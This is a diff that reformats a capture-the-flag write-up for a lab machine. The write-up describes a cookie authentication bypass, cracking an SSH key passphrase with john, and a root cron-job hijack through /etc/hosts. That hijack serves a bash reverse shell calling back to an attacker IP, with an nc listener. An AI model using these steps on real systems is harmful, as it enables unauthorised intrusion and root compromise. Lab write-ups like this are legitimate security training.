@@ -49,7 +49,7 @@ If we take the hint for the first task we can see that this is going to be owasp
 We can run this code in the browser console to exploit the vulnerability.<br>
 `Cookies.set("SessionToken", "")`
 Refresh the page and now we are here:
-![admin page](https://i.ibb.co/LkNrg6j/7.png)
+![admin page](https://i.ibb.co/LkNrg6j/7.png)<br>
 It looks like there is a private key for james. So let's copy it and try to ssh with it.
 The private key works but it wants a passphrase for it. We can crack it with ssh2john and john.<br>
 `ssh2john p_id > hash.txt`<br>
@@ -57,14 +57,13 @@ The private key works but it wants a passphrase for it. We can crack it with ssh
 The password is **james13**. <br>
 Let's ssh into james account.
 And now we got the first flag.
-![todo.txt](https://i.ibb.co/HtQmk7Q/8.png)
+![todo.txt](https://i.ibb.co/HtQmk7Q/8.png)<br>
 We got these notes there that can give us some more information.<br>
 We already know about the **.overpass** file so let's read it.<br>
 Here is what we got from there.
-![cyberchef](https://i.ibb.co/SmRxDVg/9.png)
-`[{"name":"System","pass":"saydrawnlyingpicture"}]`
-
-we can also read **/etc/crontab**
+![cyberchef](https://i.ibb.co/SmRxDVg/9.png) <br>
+`[{"name":"System","pass":"saydrawnlyingpicture"}]`<br>
+we can also read **/etc/crontab**<br>
 ```crontab
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -80,13 +79,13 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 We can see that it always trying to download **buildscript.sh** from **overpass.thm/downloads/src/**. <br>
 God is being glorius today and we can change the **/etc/hosts/** file. So we need to and there the following line:
 `<our ip> overpass.thm`. It is going to create a link to our ip instead of the ip that it is supposed to.
-In our machine we have to create the environment for this.
-`mkdir -m downloads/src/`
-Then in the src folder we have to create our file **buildscript.sh** and put there our reverse shell.
-`echo "bash -i >& /dev/tcp/10.2.38.40/4444 0>&1" > downloads/src/buildscript.sh`
-Now we have to run **nc** to listen to the port that we specified in the reverse shell.
-`nc -lvnp 4444`
-And finally in the other terminal session we need to start simple python server
+In our machine we have to create the environment for this.<br>
+`mkdir -m downloads/src/`<br>
+Then in the src folder we have to create our file **buildscript.sh** and put there our reverse shell.<br>
+`echo "bash -i >& /dev/tcp/10.2.38.40/4444 0>&1" > downloads/src/buildscript.sh`<br>
+Now we have to run **nc** to listen to the port that we specified in the reverse shell.<br>
+`nc -lvnp 4444`<br>
+And finally in the other terminal session we need to start simple python server<br>
 `python3 -m http.server 80` **Remember, we need to run it in the parent folder of folder downloads that we created before.**
 After few seconds we got the reverse shell to the root user in our nc terminal session.<br>
 And now we got the root flag.
